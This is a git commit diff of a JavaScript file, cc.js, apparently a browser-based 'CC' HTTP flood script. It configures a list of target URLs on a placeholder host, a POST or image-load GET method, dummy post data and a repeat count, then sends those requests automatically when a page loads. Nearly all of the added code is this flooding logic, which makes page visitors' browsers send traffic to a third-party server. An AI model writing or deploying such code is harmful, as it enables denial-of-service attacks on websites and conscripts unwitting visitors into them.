08749194211486f7bd6740e8da9a608102ebdec8
狗狗 <363384806@qq.com>
2019-08-14 15:42:36 +0800

    OK

--- cc.js
+++ cc.js
@@ -1,4 +1,30 @@
-window.onload = function () {
+window.addEventListener('load', function () {
+
+	/***********************
+	 * 请求参数设置
+	 ***********************/ 
+	var ccData = {
+
+		// 发送请求的目标URL数组
+		url: [
+			'http://b.com:8081/index.php?xxx=99999',
+			'http://b.com:8081/index.php?xxx=99999'
+		],
+
+		// 请求方法，可以是 GET 或 POST
+		// 当请求方法是 GET 时使用加载图片的方式发送请求
+		// 当请求方法是 POST 时使用 ajax 方式发送请求
+		method: 'POST',
+
+		// 当请求方法是 POST 时所使用的提交数据
+		data: 'here is post data while request method is post',
+
+		// 每个 URL 发起请求的次数
+		count: 10
+	}
+
+
+	// 执行请求
 	for (var i = 0; i < ccData.url.length; i++) {
 		var urlObj = new URL(ccData.url[i]);
 		for (var j = 0; j < ccData.count; j++) {
@@ -19,4 +45,4 @@ window.onload = function () {
 			}
 		}
 	}
-};
+});
